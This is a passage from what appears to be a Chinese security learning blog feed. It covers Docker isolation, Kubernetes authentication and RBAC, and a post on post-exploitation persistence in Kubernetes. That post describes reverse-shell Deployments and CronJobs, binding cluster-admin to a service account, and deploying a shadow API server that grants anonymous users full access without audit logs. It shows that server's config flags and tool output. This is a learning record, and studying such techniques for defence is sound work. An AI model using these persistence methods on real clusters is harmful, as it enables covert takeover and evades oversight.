id="chroot"><a href="#chroot" class="headerlink" title="chroot"></a>chroot</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">在linux系统中，系统默认目录是用<span class="token operator">/</span> 根目录来开头的，chroot的使用能够实现更改当前系统根目录结构，通过改变的根目录结构，实现限制用户的权利，在新的根目录下并不能直接访问旧系统根目录的结构文件也就建立了个与原来系统完全隔离的目录结构<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Control-Groups"><a href="#Control-Groups" class="headerlink" title="Control Groups"></a>Control Groups</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">CPU和内存无法被命名空间进行docker容器和宿主机的隔离，多个容器依旧会共同占用宿主机的这些物理资源如果其中一个容器执行CPU密集型的任务，那么就会影响其他容器中的性能和执行系哦啊率，导致多个容器互相影响并且抢占资源，此处的CGROUPS就能够实现隔离宿主机上的物理资源，如CPU、内存、磁盘等每个CGROUPS都是一组被相同标准和参数限制的进程，不同的CGROUP之间是有层级关系的，也就是说可以从父类继承一些用于限制资源使用的标准和参数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker1/d8.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">所以CGROUPS中，所有的任务就是一个系统的进程，而CGROUP是一组按照标准划分的进程，在机制中，所有资源控制都是以CGROUP作为单位实现的，每个进程都可以随时加入或退出一个CGROUPlinux中使用文件系统来实现CGROUP，查看子系统方式如下lssubsys <span class="token operator">-</span>mcpuset <span class="token operator">/</span>sys<span class="token operator">/</span>fs<span class="token operator">/</span>cgroup<span class="token operator">/</span>cpusetcpu<span class="token punctuation">,</span>cpuacct <span class="token operator">/</span>sys<span class="token operator">/</span>fs<span class="token operator">/</span>cgroup<span class="token operator">/</span>cpu<span class="token punctuation">,</span>cpuacctblkio <span class="token operator">/</span>sys<span class="token operator">/</span>fs<span class="token operator">/</span>cgroup<span class="token operator">/</span>blkiomemory <span class="token operator">/</span>sys<span class="token operator">/</span>fs<span class="token operator">/</span>cgroup<span class="token operator">/</span>memorydevices <span class="token operator">/</span>sys<span class="token operator">/</span>fs<span class="token operator">/</span>cgroup<span class="token operator">/</span>devicesfreezer <span class="token operator">/</span>sys<span class="token operator">/</span>fs<span class="token operator">/</span>cgroup<span class="token operator">/</span>freezernet_cls<span class="token punctuation">,</span>net_prio <span class="token operator">/</span>sys<span class="token operator">/</span>fs<span class="token operator">/</span>cgroup<span class="token operator">/</span>net_cls<span class="token punctuation">,</span>net_prioperf_event <span class="token operator">/</span>sys<span class="token operator">/</span>fs<span class="token operator">/</span>cgroup<span class="token operator">/</span>perf_eventhugetlb <span class="token operator">/</span>sys<span class="token operator">/</span>fs<span class="token operator">/</span>cgroup<span class="token operator">/</span>hugetlbpids <span class="token operator">/</span>sys<span class="token operator">/</span>fs<span class="token operator">/</span>cgroup<span class="token operator">/</span>pidsrdma <span class="token operator">/</span>sys<span class="token operator">/</span>fs<span class="token operator">/</span>cgroup<span class="token operator">/</span>rdma<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker1/d9.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">linux大多数都有相似子系统，cpuset、cpu这些都是子系统，能够为对应的控制组分配资源并限制资源的使用，如果想要创建一个新的cgroup只需要子啊想要分配或者限制资源的子系统下新建一个任建军，这个文件夹下就会自动出现内容例如安装docker后，会发现子系统目录下都有一个名为docker的文件夹<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker1/d10.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">此处的7bb8c1880f14da4649就是先前运行的一个docker容器，docker启动时候会为容器创建一个和容器表舒服相同的cgroup，如下层级关系：cpu => docker => docker标识符<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker1/d11.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">每个cgroup下都有一个tasks文件，存储这属于当前控制组的所有进程pid，作为负责cpu的子系统，cpu<span class="token punctuation">.</span>cfs_quota_us可以对cpu的使用做出限制，如果当前文件内容为50000，则控制组中全部进程cpu占用率不超过50<span class="token operator">%</span>也就是说想要控制docker某个容器的资源使用率可以用过docker这个父控制组下找到对应的子控制组并改变他们对应的文件内容，当然也可以在运行时候就使用这个参数，让docker进程去改变文件内容，实现合理分配多个容器资源，不会出现互相抢资源的情况<span class="token function">cat</span>  <span class="token operator">/</span>sys<span class="token operator">/</span>fs<span class="token operator">/</span>cgroup<span class="token operator">/</span>cpu<span class="token operator">/</span>docker<span class="token operator">/</span>9b4b1bdea9856e2def46c1cb6f780e3ec2e010248fda40cd08bc0b6f5e90f836<span class="token operator">/</span>cpu<span class="token punctuation">.</span>cfs_quota_us<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker1/d12.png"></p><h2 id="unionFS"><a href="#unionFS" class="headerlink" title="unionFS"></a>unionFS</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">命名空间、控制组分别解决了不同资源的隔离问题，如进程、文件、cpu等，但还有个关键点，镜像所谓镜像，可以通过docker run将远处下载的镜像跑起来，镜像本质是一个压缩包，导出镜像文件如下，和linux实际操作系统根目录文件相同，也就是说docker镜像其实就是一个文件docker <span class="token function">ps</span>docker export 9b4b1bdea985  > ubuntu<span class="token punctuation">.</span>tartar <span class="token operator">-</span>xvf ubuntu<span class="token punctuation">.</span>tar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker1/d13.png"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CloudSecurity </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kubernetes安全机制</title>
      <link href="2022/03/31/kubernetes-an-quan-ji-zhi/"/>
      <url>2022/03/31/kubernetes-an-quan-ji-zhi/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">访问kubernetes集群的时候，需要经过安全机制的三个步骤才能访问，过程中都会经过apiserver的统一协调机制如下认证：判断用户是否为集群正常的合法用户【判断用户真伪】鉴权：判断api调用是否合法【是否有权限】准入控制：会有一个类似acl的列表进行校验，如果列表中有相关请求内容则通过，否则就不通过【能不能操作】简单流程如下，主要需要理解的是认证和鉴权模块<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s5/k1.png"></h2><h2 id="主要关注的步骤"><a href="#主要关注的步骤" class="headerlink" title="主要关注的步骤"></a>主要关注的步骤</h2><h3 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">认证策略包括四种：匿名认证：默认情况下匿名认证是关闭的白名单认证：basicauth认证一般情况下是服务器启动时加载的basic用户配置文件，并且通过没有更多配置的话basic的认证仅仅只能访问没有其他的操作权限，如今已经很少使用了token认证：Webhooks、ServiceAccount Tokens、OpenID Connect Tokens等token认证更多涉及到对集群和pod的操作x509证书认证：clientCA认证，TLS bootstrapping等是kubernetes集群组件间默认使用的认证方式，同事也说kubectl客户端对应kube config中经过使用的凭证<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="鉴权"><a href="#鉴权" class="headerlink" title="鉴权"></a>鉴权</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">当apiserver通过用户认证后就会到达鉴权的阶段，主要是判断api调用是否合法，主要包括四种Always：集群不需要鉴权ABAC：基于属性的访问控制PBAC：基于角色的访问控制，主流鉴权方式Node:对kubelet进行鉴权的特殊模式，限制每个Node只访问它自身运行的Pod及相关Service、Endpoints等信息Webhook:通过外部调用REST服务对用户鉴权，可自行编写鉴权逻辑通过webhook方式注册为k8s的鉴权服务，从而实现更加复杂的规则<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="RBAC"><a href="#RBAC" class="headerlink" title="RBAC"></a>RBAC</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">rolebased access control基于角色的访问控制，在RBAC中权限与角色相关关联，用户通过成为适当的角色然后才能获得到相关角色的权限。意思就是权限给予角色，而用户成为角色后，权限就又从角色给予的用户，此处用户可以是用户、用户组、服务账户1<span class="token punctuation">.</span>15版本中集群默认不开启RBAC，从1<span class="token punctuation">.</span>16版本起默认启用RBAC访问控制策略，从1<span class="token punctuation">.</span>18RBAC已作为稳定功能<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="角色用户相关"><a href="#角色用户相关" class="headerlink" title="角色用户相关"></a>角色用户相关</h5><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">角色role：普通角色，授权特定命名空间访问权限，用于日常分配给运行的容器clusterrole：集群角色，授权所有命名空间访问权限，用于更多的管理工作角色绑定rolebinding：角色绑定到主体【同role对应】clusterrolebinding：集群角色绑定到主体【同clusterrole对应】主体user：用户<span class="token function">group</span>：用户组serviceaccount：服务账号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s5/k2.png" alt="img"></h3><h5 id="namespace命名空间"><a href="#namespace命名空间" class="headerlink" title="namespace命名空间"></a>namespace命名空间</h5><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">namespace命名空间是多个用户之间划分集群资源的一种方式，kubernetes中每个资源都只能在一个namespace下获取命名命名空间<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s5/k3.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">如上图默认是有4个命名空间default           默认使用kube<span class="token operator">-</span>node<span class="token operator">-</span>lease   集群建的心跳维护kube<span class="token operator">-</span>public       能够被任何人访问包括匿名访问kube<span class="token operator">-</span>system       kubernetes系统创建对象所使用的主要关注的命名空间是default、kube<span class="token operator">-</span>system已知RBAC中的重点是角色，角色又细分为role、clusterrole查看普通角色，没有设置的话默认是在default中，当前暂未设置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s5/k4.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">当然可以指定到其他的命名空间，查看普通角色kubectl get role <span class="token operator">-</span>n kube<span class="token operator">-</span>system<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s5/k5.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">查看集群角色，此处从default或kube<span class="token operator">-</span>system命名空间查出来其实都是一样的kubectl get clusterrole <span class="token operator">-</span>n kube<span class="token operator">-</span>system<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s5/k6.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">集群角色中的最高权限是cluster<span class="token operator">-</span>admin，具备集群所有资源的管控权限，如果给其他用户、用户组、服务账户绑定上该角色，也同样具备相关权限及更多的安全隐患<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s5/k7.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">当然普通的admin用户权限也很大，比cluster<span class="token operator">-</span>admin会少许多权限<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s5/k8.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">基本创建绑定方法kubectl create clusterrolebinding  名称  <span class="token operator">--</span>clusterrole=给予的角色  <span class="token operator">--</span>user=给予的用户 <span class="token operator">--</span><span class="token function">group</span>=给予的组 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s5/k9.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">查看绑定情况kubectl get clusterrolebinding  <span class="token operator">-</span>n kube<span class="token operator">-</span>system  <span class="token punctuation">|</span> grep cluster<span class="token operator">-</span>adminnew <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s5/k10.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">kubectl describe clusterrolebinding <span class="token operator">-</span>n 命名空间 绑定名字<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s5/k11.png"></p><h5 id="serviceaccount服务账户"><a href="#serviceaccount服务账户" class="headerlink" title="serviceaccount服务账户"></a>serviceaccount服务账户</h5><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">k8s为pod内部进程访问apiserver创建的用户，因为是pod内部的，所以也会有对应的命名空间k8s有一种资源对象为secret，分为两种，一种是容器运行时的敏感配置如密码等，一种是用于记录serviceaccount的service<span class="token operator">-</span>account<span class="token operator">-</span>token获取secretskubectl describe secrets <span class="token operator">-</span>n kube<span class="token operator">-</span>system  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s5/k12.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">如上图所示service<span class="token operator">-</span>account<span class="token operator">-</span>token中包含了ca<span class="token punctuation">.</span>crt、namespace、tokenca<span class="token punctuation">.</span>crt：根证书，给apiserver发送时候使用namespace：作用域空间token：apiserver私钥签名的凭证，访问apiserver时进行认证<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s5/k13.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">如上图账户名在<span class="token operator">-</span>token前面的default，给这个服务账户绑定cluster<span class="token operator">-</span>admin，也就意味着default这个serviceaccount将拥有集群最高权限，那么他创建的pod也会有集群最高权限的podkubectl create clusterrolebinding defaultadmin <span class="token operator">--</span>clusterrole=cluster<span class="token operator">-</span>admin <span class="token operator">--</span>serviceaccount=kube<span class="token operator">-</span>system:default<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s5/k14.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">确认成功如下kubectl describe clusterrolebinding <span class="token operator">-</span>n 命名空间  绑定名字<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s5/k15.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s5/k16.png"></p><h3 id="准入控制"><a href="#准入控制" class="headerlink" title="准入控制"></a>准入控制</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">以插件形式运行在apiserver进程中，会在鉴权后对象被存储到etcd前拦截apiserver的请求， 对相关请求的资源进行校验、修改、拦截等操作<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CloudSecurity </tag>
            
            <tag> Kubernetes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kubernetes权限维持</title>
      <link href="2022/03/31/kubernetes-quan-xian-wei-chi/"/>
      <url>2022/03/31/kubernetes-quan-xian-wei-chi/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">通过各种方法获得Kubernetes集群中的mastes或者node如何进行权限维持，从而进步渗透利用？比如像linux、windows那样进行？此处以四种方法展开<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="控制器利用"><a href="#控制器利用" class="headerlink" title="控制器利用"></a>控制器利用</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">创建容器时， 通过启用DaemonSet、Deployment，可以使容器和子容器即使被删除了也能够进步恢复重启，以实现权限维持的效果涉及相关概念：ReplicationController（RC）：确保在任何时候都有特定数量的Pod处于运行状态Replication <span class="token function">Set</span>（RS）：此处推荐使用RS和Deployment代替RC，实际上RS和RC的功能基本一致，目前唯一的一个区别就是RC只支持基于等式的selectorDeployment：实现出来的效果和职责同RC一样，可以理解为RC的升级版本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Deployment"><a href="#Deployment" class="headerlink" title="Deployment"></a>Deployment</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">编写反弹shell的yaml文件即可<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s4/k1.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">node1、node2都将反弹shell如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s4/k2.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s4/k3.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">期间对创建出来的pod进行删除后，deployment将自动创建恢复pod，以再次实现反弹shell权限维持<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s4/k4.png"></p><h3 id="DaemonSet"><a href="#DaemonSet" class="headerlink" title="DaemonSet"></a>DaemonSet</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">同理操作即可，轮流弹shell效果相同<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s4/k5.png" alt="img"></p><h2 id="shadowapiserver利用"><a href="#shadowapiserver利用" class="headerlink" title="shadowapiserver利用"></a>shadowapiserver利用</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">此处自行部署的shadowapiserver该apiserver同集群内现有的apiserver具备相同功能，同时进步开启了k8s的权限，接收匿名请求且不保存日志，进步使得攻击者能够无痕迹的管理整个集群查看当前的api<span class="token operator">-</span>server信息如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s4/k6.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">寻找脆弱点，确认如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s4/k7.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">直接部署shadowapiserver，效果如下2022<span class="token operator">/</span>03<span class="token operator">/</span>31 06:20:04 shadow api<span class="token operator">-</span>server deploy success<span class="token operator">!</span>        shadow api<span class="token operator">-</span>server pod name:kube<span class="token operator">-</span>apiserver<span class="token operator">-</span>master<span class="token operator">-</span>shadow<span class="token punctuation">,</span> namespace:kube<span class="token operator">-</span>system<span class="token punctuation">,</span> node name:master        listening insecure<span class="token operator">-</span>port: 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:9443        listening secure<span class="token operator">-</span>port: 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:9444     enabled all privilege <span class="token keyword">for</span> system:anonymous user        go further run `cdk kcurl anonymous get http:<span class="token operator">/</span><span class="token operator">/</span>your<span class="token operator">-</span>node<span class="token operator">-</span>intranet<span class="token operator">-</span>ip:9443<span class="token operator">/</span>api` to takeover cluster with none audit logs<span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s4/k8.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">在看眼部署出来的shadow，确认部署成功后的shadowapiserver<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s4/k9.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">相关实现功能配置信息如下kube<span class="token operator">-</span>apiserver      <span class="token operator">--</span>advertise<span class="token operator">-</span>address=192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>3<span class="token punctuation">.</span>19      <span class="token operator">--</span>allow<span class="token operator">-</span>privileged=true      <span class="token operator">--</span>authorization<span class="token operator">-</span>mode=AlwaysAllow      <span class="token operator">--</span>client<span class="token operator">-</span>ca<span class="token operator">-</span>file=<span class="token operator">/</span>etc<span class="token operator">/</span>kubernetes<span class="token operator">/</span>pki<span class="token operator">/</span>ca<span class="token punctuation">.</span>crt      <span class="token operator">--</span><span class="token function">enable-admission</span><span class="token operator">-</span>plugins=NodeRestriction      <span class="token operator">--</span><span class="token function">enable-bootstrap</span><span class="token operator">-</span>token<span class="token operator">-</span>auth=true      <span class="token operator">--</span>etcd<span class="token operator">-</span>cafile=<span class="token operator">/</span>etc<span class="token operator">/</span>kubernetes<span class="token operator">/</span>pki<span class="token operator">/</span>etcd<span class="token operator">/</span>ca<span class="token punctuation">.</span>crt      <span class="token operator">--</span>etcd<span class="token operator">-</span>certfile=<span class="token operator">/</span>etc<span class="token operator">/</span>kubernetes<span class="token operator">/</span>pki<span class="token operator">/</span>apiserver<span class="token operator">-</span>etcd<span class="token operator">-</span>client<span class="token punctuation">.</span>crt      <span class="token operator">--</span>insecure<span class="token operator">-</span>bind<span class="token operator">-</span>address=0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0      <span class="token operator">--</span>anonymous<span class="token operator">-</span>auth=true      <span class="token operator">--</span>etcd<span class="token operator">-</span>keyfile=<span class="token operator">/</span>etc<span class="token operator">/</span>kubernetes<span class="token operator">/</span>pki<span class="token operator">/</span>apiserver<span class="token operator">-</span>etcd<span class="token operator">-</span>client<span class="token punctuation">.</span>key      <span class="token operator">--</span>etcd<span class="token operator">-</span>servers=https:<span class="token operator">/</span><span class="token operator">/</span>127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1:2379      <span class="token operator">--</span>insecure<span class="token operator">-</span>port=9443      <span class="token operator">--</span>kubelet<span class="token operator">-</span>client<span class="token operator">-</span>certificate=<span class="token operator">/</span>etc<span class="token operator">/</span>kubernetes<span class="token operator">/</span>pki<span class="token operator">/</span>apiserver<span class="token operator">-</span>kubelet<span class="token operator">-</span>client<span class="token punctuation">.</span>crt      <span class="token operator">--</span>kubelet<span class="token operator">-</span>client<span class="token operator">-</span>key=<span class="token operator">/</span>etc<span class="token operator">/</span>kubernetes<span class="token operator">/</span>pki<span class="token operator">/</span>apiserver<span class="token operator">-</span>kubelet<span class="token operator">-</span>client<span class="token punctuation">.</span>key      <span class="token operator">--</span>kubelet<span class="token operator">-</span>preferred<span class="token operator">-</span>address<span class="token operator">-</span>types=InternalIP<span class="token punctuation">,</span>ExternalIP<span class="token punctuation">,</span>Hostname      <span class="token operator">--</span>proxy<span class="token operator">-</span>client<span class="token operator">-</span>cert<span class="token operator">-</span>file=<span class="token operator">/</span>etc<span class="token operator">/</span>kubernetes<span class="token operator">/</span>pki<span class="token operator">/</span>front<span class="token operator">-</span>proxy<span class="token operator">-</span>client<span class="token punctuation">.</span>crt      <span class="token operator">--</span>proxy<span class="token operator">-</span>client<span class="token operator">-</span>key<span class="token operator">-</span>file=<span class="token operator">/</span>etc<span class="token operator">/</span>kubernetes<span class="token operator">/</span>pki<span class="token operator">/</span>front<span class="token operator">-</span>proxy<span class="token operator">-</span>client<span class="token punctuation">.</span>key      <span class="token operator">--</span>requestheader<span class="token operator">-</span>allowed<span class="token operator">-</span>names=front<span class="token operator">-</span>proxy<span class="token operator">-</span>client      <span class="token operator">--</span>requestheader<span class="token operator">-</span>client<span class="token operator">-</span>ca<span class="token operator">-</span>file=<span class="token operator">/</span>etc<span class="token operator">/</span>kubernetes<span class="token operator">/</span>pki<span class="token operator">/</span>front<span class="token operator">-</span>proxy<span class="token operator">-</span>ca<span class="token punctuation">.</span>crt      <span class="token operator">--</span>requestheader<span class="token operator">-</span>extra<span class="token operator">-</span>headers<span class="token operator">-</span>prefix=X<span class="token operator">-</span>Remote<span class="token operator">-</span>Extra<span class="token operator">-</span>      <span class="token operator">--</span>requestheader<span class="token operator">-</span><span class="token function">group-headers</span>=X<span class="token operator">-</span>Remote<span class="token operator">-</span><span class="token function">Group</span>      <span class="token operator">--</span>requestheader<span class="token operator">-</span>username<span class="token operator">-</span>headers=X<span class="token operator">-</span>Remote<span class="token operator">-</span>User      <span class="token operator">--</span>secure<span class="token operator">-</span>port=9444      <span class="token operator">--</span>service<span class="token operator">-</span>account<span class="token operator">-</span>key<span class="token operator">-</span>file=<span class="token operator">/</span>etc<span class="token operator">/</span>kubernetes<span class="token operator">/</span>pki<span class="token operator">/</span>sa<span class="token punctuation">.</span>pub      <span class="token operator">--</span>service<span class="token operator">-</span>cluster<span class="token operator">-</span>ip<span class="token operator">-</span>range=10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token operator">/</span>16      <span class="token operator">--</span>tls<span class="token operator">-</span>cert<span class="token operator">-</span>file=<span class="token operator">/</span>etc<span class="token operator">/</span>kubernetes<span class="token operator">/</span>pki<span class="token operator">/</span>apiserver<span class="token punctuation">.</span>crt      <span class="token operator">--</span>tls<span class="token operator">-</span>private<span class="token operator">-</span>key<span class="token operator">-</span>file=<span class="token operator">/</span>etc<span class="token operator">/</span>kubernetes<span class="token operator">/</span>pki<span class="token operator">/</span>apiserver<span class="token punctuation">.</span>key<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s4/k10.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">此处部署成功后，后续我们都可以用这个新的api进行操作<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s4/k11.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">直接获取各类token信息<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s4/k12.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">同理kubectl也不需要认证<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s4/k13.png"></p><h2 id="cronjob"><a href="#cronjob" class="headerlink" title="cronjob"></a>cronjob</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">用于执行周期性的动作，通过yaml部署以实现周期性的反弹shell，创建计划任务的yaml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s4/k14.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">创建成功效果&amp;yaml中反弹shell信息如下<span aria-hidden="true" 